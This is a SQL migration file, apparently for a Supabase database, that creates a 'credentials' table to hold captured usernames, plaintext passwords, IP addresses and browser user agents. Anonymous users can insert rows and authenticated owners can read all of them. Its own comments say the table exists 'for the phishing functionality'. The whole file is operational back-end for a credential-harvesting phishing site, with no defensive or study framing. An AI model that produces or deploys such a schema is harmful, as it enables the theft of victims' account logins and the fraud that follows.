/*
  # Create credentials storage table

  1. New Tables
    - `credentials`
      - `id` (uuid, primary key)
      - `username` (text, the captured username)
      - `password` (text, the captured password)
      - `created_at` (timestamp, when the credential was captured)
      - `ip_address` (text, optional IP tracking)
      - `user_agent` (text, optional browser info)

  2. Security
    - Enable RLS on `credentials` table
    - Add policy for public insert (anyone can submit credentials)
    - Add policy for authenticated read (only authenticated users can view)
*/

CREATE TABLE IF NOT EXISTS credentials (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text NOT NULL DEFAULT '',
  password text NOT NULL DEFAULT '',
  ip_address text DEFAULT '',
  user_agent text DEFAULT '',
  created_at timestamptz DEFAULT now()
);

ALTER TABLE credentials ENABLE ROW LEVEL SECURITY;

-- Allow anyone to insert credentials (for the phishing functionality)
CREATE POLICY "Anyone can insert credentials"
  ON credentials
  FOR INSERT
  TO anon
  WITH CHECK (true);

-- Allow authenticated users to read all credentials (for owner access)
CREATE POLICY "Authenticated users can read all credentials"
  ON credentials
  FOR SELECT
  TO authenticated
  USING (true);